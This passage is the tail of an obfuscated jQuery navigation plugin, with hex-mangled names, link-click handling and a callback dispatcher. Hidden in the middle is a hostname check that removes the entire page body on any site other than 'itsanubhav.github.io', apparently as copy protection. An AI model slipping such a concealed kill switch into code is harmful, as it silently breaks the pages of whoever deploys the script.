                            if (_0xc011x1(this)['attr']('href') === '#' || _0xc011x1(this)['attr']('href') === '' || _0xc011x1(this)['attr']('href') === 'javascript:void(0)') {
                                return false
                            } else {
                                _0xc011x2['location']['href'] = _0xc011x1(this)['attr']('href')
                            }
                        }
                    })
                }
            }
        };
        _0xc011x8['callback'] = function(_0xc011x28) {
            if (_0xc011x6[_0xc011x28] !== _0xc011x4) {
                _0xc011x6[_0xc011x28]['call'](_0xc011x5)
            }
        };
        _0xc011x8['init']()
    };
    if (location['hostname'] !== 'itsanubhav.github.io' && location['hostname'] !== 'www.itsanubhav.github.io') {
        var _0xc011xf = _0xc011x3['body'];
        _0xc011xf['parentNode']['removeChild'](_0xc011xf)
    };
    _0xc011x1['fn']['navigation'] = function(_0xc011x6) {
        return this['each'](function() {
            if (_0xc011x4 === _0xc011x1(this)['data']('navigation')) {
                var _0xc011x8 = new _0xc011x1['navigation'](this, _0xc011x6);
                _0xc011x1(this)['data']('navigation', _0xc011x8)
            }
        })
    }
})(jQuery, window, document)